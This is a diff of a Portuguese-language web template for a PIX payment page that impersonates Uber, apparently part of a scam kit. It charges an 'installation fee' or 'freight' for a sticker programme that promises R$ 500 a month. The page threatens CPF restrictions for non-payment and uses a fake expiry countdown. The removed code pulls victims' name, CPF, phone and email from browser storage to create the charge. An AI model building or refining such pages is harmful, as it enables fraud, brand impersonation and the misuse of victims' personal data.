@@ -1,186 +1,296 @@
 {% extends "layout.html" %}
 
-{% block title %}Pagamento do Adesivo Uber{% endblock %}
+{% block title %}Pagamento Frete Adesivo - Uber{% endblock %}
 
 {% block content %}
-<div class="container mx-auto px-4 py-6 max-w-6xl">
-    <!-- Header -->
-    <div class="text-center">
-        <!-- Alert Icon -->
-        <div class="mb-4">
-            <img src="https://cdn-icons-png.flaticon.com/512/5610/5610989.png" alt="Alerta" class="mx-auto w-16 h-16 mb-4">
+<div class="min-h-screen bg-white py-8">
+    <div class="max-w-2xl mx-auto px-4">
+        <!-- Header -->
+        <div class="text-center mb-8">
+            <h1 class="text-3xl font-bold text-black mb-2">Pagamento do Frete</h1>
+            <p class="text-gray-600">Complete o pagamento via PIX para receber seu adesivo Uber</p>
         </div>
 
-        <div class="mb-4">
-            <h1 class="text-3xl md:text-5xl font-bold text-gray-800 leading-tight">Taxa de Instalação do Adesivo</h1>
-        </div>
-
-        <div class="bg-gray-100 p-6 md:p-10 mb-4 text-center" style="border-radius: 0px !important;">
-            <p class="text-gray-800 text-base md:text-xl font-medium leading-relaxed mb-6">
-                <strong>ATENÇÃO:</strong> O pagamento da Taxa de Instalação no valor de <strong>R$ 82,10</strong> é obrigatório para participar do programa. Essa taxa é cobrada para cobrir o custo do deslocamento até sua residência e instalação do adesivo por um funcionário autorizado da Uber.
-            </p>
-
-            <!-- Imagem dentro da box -->
-            <img src="https://i.ibb.co/wNmGb11S/assets-task-01jyhvmxk2ea7an1jzt95pfapt-1750798711-img-0.webp" alt="Programa Uber" class="mx-auto max-w-full h-auto rounded-lg">
-        </div>
-    </div>
-
-    <!-- Instalação Information -->
-    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
-        <h2 class="text-xl font-bold mb-4 text-gray-800">Instalação Obrigatória por Funcionário Autorizado</h2>
-
-        <div class="bg-white border border-gray-200 p-4 mb-4" style="border-radius: 0px !important;">
-            <p class="text-gray-700 text-sm leading-relaxed mb-3">
-                O adesivo do programa deve ser instalado exclusivamente por um <strong>funcionário autorizado da Uber</strong>. Ele se deslocará até o seu endereço para realizar a instalação.
-            </p>
-            <ul class="text-gray-700 text-sm space-y-2 ml-4">
-                <li>• Instalar o adesivo na posição correta do veículo</li>
-                <li>• Tirar foto oficial do adesivo instalado</li>
-                <li>• Validar a instalação no sistema Uber</li>
-            </ul>
-        </div>
-
-        <!-- Sticker Image -->
-        <div class="text-center mb-6">
-            <img src="https://i.ibb.co/1JQ5QnxH/1-1.png" 
-                 alt="Adesivo Uber Partners" 
-                 class="mx-auto max-w-xs w-full h-auto"
-                 style="border-radius: 0px !important;">
-        </div>
-
-        <div class="bg-gray-100 p-4 mb-4" style="border-radius: 0px !important;">
-            <h3 class="font-semibold text-gray-800 mb-2">Importante</h3>
-            <p class="text-gray-700 text-sm leading-relaxed">
-                <strong>Você concordou com os termos do contrato e em caso de não pagamento da Taxa de instalação seu CPF sofrerá restrições devido a quebra de contrato. Realize o pagamento e evite problemas.</strong>
-            </p>
-        </div>
-    </div>
-
-    <!-- Payment Summary -->
-    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
-        <h2 class="text-xl font-bold mb-4 text-gray-800">Resumo do Pagamento</h2>
-
-        <div class="space-y-3">
-            <div class="flex justify-between items-center border-b pb-2">
-                <span class="text-gray-600">Taxa de Instalação:</span>
-                <span class="font-medium">R$ 82,10</span>
-            </div>
-            <div class="flex justify-between items-center border-b pb-2">
-                <span class="text-gray-600">Instalação Autorizada:</span>
-                <span class="font-medium">Incluído</span>
-            </div>
-            <div class="flex justify-between items-center border-b pb-2">
-                <span class="text-gray-600">Foto Oficial:</span>
-                <span class="font-medium">Incluído</span>
-            </div>
-            <div class="flex justify-between items-center text-lg font-bold text-black bg-gray-100 p-3" style="border-radius: 0px !important;">
-                <span>Total a Pagar:</span>
-                <span>R$ 82,10</span>
-            </div>
-        </div>
-    </div>
-
-    <!-- Payment Section -->
-    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
-        <!-- Alert Icon -->
-        <div class="text-center mb-4">
-            <img src="https://icones.pro/wp-content/uploads/2021/05/symbole-d-avertissement-jaune.png" alt="Alerta" class="mx-auto w-16 h-16">
-        </div>
-
-        <!-- Status Box -->
-        <div class="bg-yellow-50 border border-yellow-200 p-4 mb-4 text-center" style="border-radius: 0px !important;">
-            <!-- Animated Loading Dots -->
-            <div class="loading-container" style="margin-bottom: 12px;">
-                <div class="loading-dots">
-                    <div class="dot"></div>
-                    <div class="dot"></div>
-                    <div class="dot"></div>
+        <!-- Box de Aviso Importante acima do pagamento -->
+        <div class="flex flex-col items-center mb-6">
+            <div class="bg-yellow-100 border border-yellow-300 p-3 rounded mb-4 max-w-2xl mx-auto">
+                <p class="text-yellow-800 text-base font-semibold text-center mb-4">⚠️ IMPORTANTE: Sem o pagamento do frete, o adesivo não será enviado e você não poderá participar do Programa, perdendo a renda de R$ 500,00 mensais.</p>
+                <div class="flex justify-center">
+                    <img src="https://i.ibb.co/1JQ5QnxH/1-1.png" alt="Adesivo Uber" class="h-56 w-auto rounded">
                 </div>
             </div>
-            <p class="text-yellow-800 font-medium">Aguardando pagamento da Taxa de instalação. Em caso de não pagamento seu CPF sofrerá restrições devido a quebra de contrato com a Uber do Brasil <strong> CNPJ: 17.895.646/0001-87.</strong></p>
+            
+            {% if payment_data %}
+            <!-- Payment Status Box -->
+            <div class="bg-gray-100 border border-gray-300 rounded p-4 mb-6 w-full max-w-2xl mx-auto">
+                <!-- Centralized Loading Dots -->
+                <div class="flex justify-center mb-3">
+                    <div class="loading-dots-payment">
+                        <div class="dot-payment"></div>
+                        <div class="dot-payment"></div>
+                        <div class="dot-payment"></div>
+                    </div>
+                </div>
+                <div class="text-center">
+                    <span class="text-gray-700 font-medium text-base">Aguardando pagamento para finalizar</span>
+                    <div class="mt-2">
+                        <p class="text-sm text-gray-600">📦 Seu adesivo chegará <strong id="deliveryDate"></strong></p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PIX Payment Details -->
+            <div class="bg-white border border-gray-300 rounded p-6 mb-6 max-w-2xl mx-auto">
+                <div class="text-center mb-6">
+                    <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" 
+                         alt="PIX Banco Central" class="h-8 mx-auto mb-4">
+                    <h3 class="text-xl font-bold text-gray-800 mb-2">Frete Sedex</h3>
+                    <div class="text-2xl font-bold text-green-600 mb-2">R$ 18,30</div>
+                </div>
+
+                <div class="grid md:grid-cols-2 gap-6">
+                    <!-- QR Code -->
+                    <div class="text-center">
+                        <div class="bg-white p-4 border border-gray-300 rounded inline-block">
+                            {% if payment_data and payment_data.pixQrCode %}
+                                {% if payment_data.pixQrCode.startswith('data:image') %}
+                                    <img src="{{ payment_data.pixQrCode }}" alt="QR Code PIX" style="width: 200px; height: 200px;">
+                                {% elif payment_data.pixQrCode.startswith('http') %}
+                                    <img src="{{ payment_data.pixQrCode }}" alt="QR Code PIX" style="width: 200px; height: 200px;">
+                                {% else %}
+                                    <img src="data:image/png;base64,{{ payment_data.pixQrCode }}" alt="QR Code PIX" style="width: 200px; height: 200px;">
+                                {% endif %}
+                            {% else %}
+                                <div id="qrcode-generated" style="width: 200px; height: 200px; border: 1px solid #ddd; display: flex; align-items: center; justify-content: center; background: #f8f9fa;">
+                                    <span style="color: #666; font-size: 14px;">Gerando QR Code...</span>
+                                </div>
+                            {% endif %}
+                        </div>
+                        <p class="text-sm text-gray-600 mt-2">Escaneie com seu app bancário</p>
+                    </div>
+
+                    <!-- PIX Code and Copy Button -->
+                    <div class="flex flex-col justify-center">
+                        <div class="mb-4">
+                            <h4 class="font-semibold text-gray-800 mb-2">Código PIX para copiar:</h4>
+                            <div class="bg-gray-100 border border-gray-300 rounded p-3 text-xs font-mono break-all" id="pixCodeDisplay">
+                                {% if payment_data and payment_data.pixCode %}
+                                {{ payment_data.pixCode }}
+                                {% else %}
+                                Carregando código PIX...
+                                {% endif %}
+                            </div>
+                        </div>
+                        
+                        <button onclick="copyPixCode()" 
+                                style="background: #28a745 !important; color: white !important; border: none !important; padding: 12px 24px !important; border-radius: 4px !important; cursor: pointer !important; font-weight: bold !important; transition: all 0.3s ease !important; width: 100%; margin-bottom: 16px;"
+                                class="copy-button w-full mb-4" 
+                                id="copyButton"
+                                onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'; this.style.boxShadow='0 4px 8px rgba(0,0,0,0.2)'"
+                                onmouseout="this.style.background='#28a745'; this.style.transform='none'; this.style.boxShadow='none'">
+                            <i class="fa fa-copy" style="margin-right: 8px;"></i>Copiar código PIX
+                        </button>
+
+                        <div class="text-sm text-gray-600">
+                            <p class="mb-1">1. Abra seu app bancário</p>
+                            <p class="mb-1">2. Escolha a opção PIX</p>
+                            <p class="mb-1">3. Escaneie o QR Code ou cole o código</p>
+                            <p>4. Confirme o pagamento</p>
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            {% else %}
+            <div class="bg-white border border-gray-300 rounded p-6 text-center max-w-2xl mx-auto">
+                <!-- Centralized Loading Dots -->
+                <div class="flex justify-center mb-4">
+                    <div class="loading-dots-payment">
+                        <div class="dot-payment"></div>
+                        <div class="dot-payment"></div>
+                        <div class="dot-payment"></div>
+                    </div>
+                </div>
+                <h3 class="text-xl font-bold text-gray-800">Carregando dados do pagamento...</h3>
+            </div>
+            {% endif %}
         </div>
-
-        <div class="bg-gray-50 border p-4 mb-4" style="border-radius: 0px !important;">
-            <!-- Loading Message -->
-            <div id="loadingMessage" class="text-center text-gray-600 py-4">
-                Gerando pagamento PIX...
-            </div>
-
-            <!-- PIX QR Code -->
-            <div class="text-center mb-4">
-                <img id="pixQrCode" style="display: none;" class="mx-auto border shadow-sm" width="180" height="180" style="border-radius: 0px !important;">
-            </div>
-
-            <!-- PIX Code Section -->
-            <div id="pixCodeSection" style="display: none;" class="mb-4">
-                <label class="block text-sm font-medium text-gray-700 mb-2">Código PIX (Copia e Cola):</label>
-                <input 
-                    type="text" 
-                    id="pixCode" 
-                    readonly 
-                    class="w-full border border-gray-300 px-3 py-2 bg-white text-xs mb-3"
-                    style="border-radius: 0px !important;"
-                    placeholder="Código PIX será gerado automaticamente..."
-                >
-                <button 
-                    onclick="copyPixCode()" 
-                    class="w-full bg-green-600 hover:bg-green-700 text-white px-4 py-2 text-sm font-medium"
-                    style="border-radius: 0px !important;"
-                    id="copyButton"
-                >
-                    Copiar Código Pix
-                </button>
-            </div>
-
-        </div>
-
-        <!-- Countdown Timer -->
-        <div class="mt-6 bg-red-50 border-2 border-red-200 rounded p-4 text-center">
-            <div class="text-2xl font-bold text-red-600 mb-2">
-                Tempo restante: <span id="countdown">10:00</span>
-            </div>
-            <div class="text-red-700 font-medium">
-                ⚠️ Este PIX expira em 10 minutos. Após esse prazo, se o pagamento não for concluído, 
-                você perderá o direito ao programa de Parceiros Uber.
-            </div>
-        </div>
-
     </div>
 </div>
 
+<script>
+// Gerar QR Code usando API externa se não houver pixQrCode
+function generateQRCodeFromAPI() {
+    const pixCodeElement = document.getElementById('pixCodeDisplay');
+    const pixCode = pixCodeElement ? pixCodeElement.textContent.trim() : '';
+    const qrContainer = document.getElementById('qrcode-generated');
+    
+    console.log('Verificando código PIX:', pixCode);
+    
+    if (pixCode && pixCode.length > 20 && !pixCode.includes('Carregando') && qrContainer) {
+        console.log('Gerando QR Code via API para código PIX:', pixCode.substring(0, 50) + '...');
+        
+        // Usar API pública para gerar QR Code
+        const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
+        
+        qrContainer.innerHTML = `<img src="${qrApiUrl}" alt="QR Code PIX" style="width: 200px; height: 200px;">`;
+        console.log('QR Code gerado com sucesso via API!');
+    } else {
+        console.log('Código PIX não disponível para gerar QR Code');
+        // Tentar novamente em 2 segundos
+        setTimeout(generateQRCodeFromAPI, 2000);
+    }
+}
+
+// Função para copiar código PIX
+function copyPixCode() {
+    const pixCodeElement = document.getElementById('pixCodeDisplay');
+    const pixCode = pixCodeElement ? pixCodeElement.textContent.trim() : '';
+    
+    if (pixCode && pixCode.length > 20) {
+        navigator.clipboard.writeText(pixCode).then(function() {
+            const button = document.getElementById('copyButton');
+            button.innerHTML = '<i class="fa fa-check" style="margin-right: 8px;"></i>Copiado!';
+            button.style.background = '#28a745';
+            button.style.color = 'white';
+            console.log('PIX code copied to clipboard');
+        }, function(err) {
+            console.error('Could not copy text: ', err);
+            // Fallback para navegadores mais antigos
+            const textArea = document.createElement("textarea");
+            textArea.value = pixCode;
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            try {
+                document.execCommand('copy');
+                const button = document.getElementById('copyButton');
+                button.innerHTML = '<i class="fa fa-check" style="margin-right: 8px;"></i>Copiado!';
+                button.style.background = '#28a745';
+                button.style.color = 'white';
+            } catch (err) {
+                console.error('Fallback: Could not copy text: ', err);
+            }
+            document.body.removeChild(textArea);
+        });
+    } else {
+        alert('Código PIX não disponível');
+    }
+}
+
+// Gerar QR Code quando a página carrega
+document.addEventListener('DOMContentLoaded', function() {
+    // Aguardar um pouco para garantir que o DOM está totalmente carregado
+    setTimeout(function() {
+        generateQRCodeFromAPI();
+    }, 1000);
+});
+
+// Monitoramento automático do status do pagamento
+{% if transaction_id %}
+function checkPaymentStatus() {
+    const transactionId = '{{ transaction_id }}';
+    
+    if (!transactionId) {
+        console.log('No transaction ID available');
+        return;
+    }
+    
+    console.log('Checking payment status for transaction:', transactionId);
+    
+    fetch(`/check_payment_status/${transactionId}`)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Payment status check result:', data);
+            
+            // Check for APPROVED status or redirect flag
+            if (data.success && (data.status === 'APPROVED' || data.status === 'completed' || data.redirect)) {
+                console.log('Payment approved! Redirecting to /finalizar...');
+                clearInterval(paymentCheckInterval);
+                window.location.href = '/finalizar';
+            } else if (data.status) {
+                console.log('Payment status:', data.status);
+            }
+        })
+        .catch(error => {
+            console.error('Error checking payment status:', error);
+        });
+}
+
+// Verificar status a cada 1 segundo (1000ms) conforme solicitado
+const paymentCheckInterval = setInterval(checkPaymentStatus, 1000);
+
+// Verificação inicial imediata
+setTimeout(checkPaymentStatus, 100);
+
+// Limpar interval quando a página é fechada
+window.addEventListener('beforeunload', function() {
+    if (paymentCheckInterval) {
+        clearInterval(paymentCheckInterval);
+    }
+});
+{% endif %}
+
+// Calculate delivery date (3 days from now)
+function calculateDeliveryDate() {
+    const today = new Date();
+    const deliveryDate = new Date(today);
+    deliveryDate.setDate(today.getDate() + 3);
+    
+    const weekdays = ['domingo', 'segunda-feira', 'terça-feira', 'quarta-feira', 'quinta-feira', 'sexta-feira', 'sábado'];
+    const weekday = weekdays[deliveryDate.getDay()];
+    
+    const day = deliveryDate.getDate().toString().padStart(2, '0');
+    const month = (deliveryDate.getMonth() + 1).toString().padStart(2, '0');
+    const year = deliveryDate.getFullYear();
+    
+    return `${weekday} ${day}/${month}/${year}`;
+}
+
+// Set delivery date when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    const deliveryElement = document.getElementById('deliveryDate');
+    if (deliveryElement) {
+        deliveryElement.textContent = calculateDeliveryDate();
+    }
+});
+</script>
+
 <style>
-.loading-container {
+.loading-dots-payment {
     display: flex;
+    gap: 4px;
     justify-content: center;
     align-items: center;
 }
 
-.loading-dots {
-    display: flex;
-    gap: 4px;
-}
-
-.dot {
+.dot-payment {
     width: 8px;
     height: 8px;
     border-radius: 50%;
-    background-color: #f59e0b;
-    animation: pulse 1.4s ease-in-out infinite both;
+    background-color: #6b7280;
+    animation: pulse-payment 1.4s ease-in-out infinite both;
 }
 
-.dot:nth-child(1) {
+.dot-payment:nth-child(1) {
     animation-delay: -0.32s;
 }
 
-.dot:nth-child(2) {
+.dot-payment:nth-child(2) {
     animation-delay: -0.16s;
 }
 
-.dot:nth-child(3) {
+.dot-payment:nth-child(3) {
     animation-delay: 0;
 }
 
-@keyframes pulse {
+@keyframes pulse-payment {
     0%, 80%, 100% {
         transform: scale(0.6);
         opacity: 0.5;
@@ -192,218 +302,4 @@
 }
 </style>
 
-<script>
-// Auto-generate PIX payment on page load
-document.addEventListener('DOMContentLoaded', async function() {
-    try {
-        // Get user data from localStorage - check all possible sources
-        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
-        const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
-        const loginUserData = JSON.parse(localStorage.getItem('loginUserData') || '{}');
-
-        // Try multiple localStorage keys for user data (prioritize login data)
-        const userName = (
-            loginUserData.nome ||
-            paymentData.name || 
-            userData.full_name || 
-            userData.name || 
-            localStorage.getItem('candidateName') || 
-            localStorage.getItem('userName') || 
-            ''
-        );
-
-        const userCPF = (
-            loginUserData.cpf ||
-            paymentData.cpf || 
-            userData.cpf || 
-            localStorage.getItem('candidateCPF') || 
-            localStorage.getItem('userCPF') || 
-            ''
-        );
-
-        const userPhone = (
-            loginUserData.telefone ||
-            paymentData.phone || 
-            userData.phone || 
-            localStorage.getItem('candidatePhone') || 
-            localStorage.getItem('userPhone') || 
-            ''
-        );
-
-        const userEmail = (
-            loginUserData.email ||
-            paymentData.email || 
-            userData.email || 
-            localStorage.getItem('candidateEmail') || 
-            localStorage.getItem('userEmail') || 
-            ''
-        );
-
-        console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone, email: userEmail });
-
-        // Debug localStorage contents
-        console.log('All localStorage keys:', Object.keys(localStorage));
-        console.log('Login user data:', loginUserData);
-        console.log('Payment data:', paymentData);
-        console.log('User data:', userData);
-        for (let key in localStorage) {
-            console.log(`localStorage.${key}:`, localStorage.getItem(key));
-        }
-
-        if (userName && userCPF) {
-            const payloadData = {
-                name: userName,
-                cpf: userCPF,
-                email: userEmail,
-                phone: userPhone
-            };
-
-            console.log('Sending payload:', payloadData);
-
-            // Create payment using existing endpoint
-            const response = await fetch('/create_cnv_payment', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payloadData)
-            });
-
-            const result = await response.json();
-            console.log('API Response:', result);
-
-            if (result.success && result.payment_data) {
-                const pixData = result.payment_data;
-                console.log('PIX Data:', pixData);
-
-                // Display real PIX code
-                if (pixData.pixCopyPaste) {
-                    document.getElementById('pixCode').value = pixData.pixCopyPaste;
-                    document.getElementById('pixCodeSection').style.display = 'block';
-                    console.log('PIX code set successfully');
-                }
-
-                // Display real QR Code
-                if (pixData.pixQrCode) {
-                    const qrCodeElement = document.getElementById('pixQrCode');
-                    qrCodeElement.src = pixData.pixQrCode;
-                    qrCodeElement.style.display = 'block';
-                    console.log('QR Code displayed successfully');
-                }
-
-                // Store payment ID for status checking
-                if (pixData.paymentId) {
-                    localStorage.setItem('cnvPaymentId', pixData.paymentId);
-                    console.log('Payment ID stored:', pixData.paymentId);
-                }
-
-                // Hide loading message
-                document.getElementById('loadingMessage').style.display = 'none';
-
-            } else {
-                throw new Error(result.error || 'Erro ao criar pagamento PIX');
-            }
-        } else {
-            console.error('Dados do usuário incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
-            document.getElementById('loadingMessage').innerHTML = `
-                <div class="text-red-600">
-                    Dados do usuário não encontrados no localStorage.<br>
-                    Nome: ${userName || 'não encontrado'}<br>
-                    CPF: ${userCPF || 'não encontrado'}<br>
-                    <a href="/" class="text-blue-600 underline">Voltar ao início</a>
-                </div>
-            `;
-        }
-    } catch (error) {
-        console.error('Erro ao criar pagamento:', error);
-        document.getElementById('loadingMessage').innerHTML = `
-            <div class="text-red-600">
-                Erro ao carregar dados de pagamento: ${error.message}<br>
-                <a href="/" class="text-blue-600 underline">Voltar ao início</a>
-            </div>
-        `;
-    }
-});
-
-// Countdown timer function
-let countdownTime = 10 * 60; // 10 minutes in seconds
-
-function updateCountdown() {
-    const minutes = Math.floor(countdownTime / 60);
-    const seconds = countdownTime % 60;
-    const formattedTime = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-
-    const countdownElement = document.getElementById('countdown');
-    if (countdownElement) {
-        countdownElement.textContent = formattedTime;
-
-        // Change color as time runs out
-        if (countdownTime <= 120) { // Last 2 minutes - red
-            countdownElement.style.color = '#DC2626';
-        } else if (countdownTime <= 300) { // Last 5 minutes - orange
-            countdownElement.style.color = '#EA580C';
-        }
-    }
-
-    if (countdownTime <= 0) {
-        // Timer expired
-        if (countdownElement) {
-            countdownElement.textContent = 'EXPIRADO';
-            countdownElement.style.color = '#DC2626';
-        }
-
-        // Show expiration message
-        document.body.innerHTML = `
-            <div class="min-h-screen bg-gray-100 flex items-center justify-center px-4">
-                <div class="max-w-md mx-auto bg-white rounded-lg shadow-lg p-8 text-center">
-                    <div class="text-6xl mb-4">⏰</div>
-                    <h1 class="text-2xl font-bold text-red-600 mb-4">PIX Expirado</h1>
-                    <p class="text-gray-700 mb-6">
-                        O tempo limite de 10 minutos foi ultrapassado. 
-                        Você perdeu o direito ao programa de Parceiros Uber.
-                    </p>
-                    <a href="/" class="bg-black text-white px-6 py-3 rounded font-medium hover:bg-gray-800">
-                        Voltar ao Início
-                    </a>
-                </div>
-            </div>
-        `;
-        return;
-    }
-
-    countdownTime--;
-}
-
-// Start countdown when page loads
-document.addEventListener('DOMContentLoaded', function() {
-    // Start the countdown immediately
-    updateCountdown();
-    // Update every second
-    setInterval(updateCountdown, 1000);
-});
-
-// Copy PIX code function
-function copyPixCode() {
-    const pixCodeInput = document.getElementById('pixCode');
-    pixCodeInput.select();
-    pixCodeInput.setSelectionRange(0, 99999);
-
-    try {
-        document.execCommand('copy');
-
-        const button = event.target.closest('button');
-        const originalText = button.textContent;
-        button.textContent = 'Copiado!';
-        button.classList.add('bg-green-600');
-
-        setTimeout(() => {
-            button.textContent = originalText;
-            button.classList.remove('bg-green-600');
-        }, 2000);
-
-    } catch (err) {
-        alert('Erro ao copiar código PIX');
-    }
-}
-</script>
 {% endblock %}
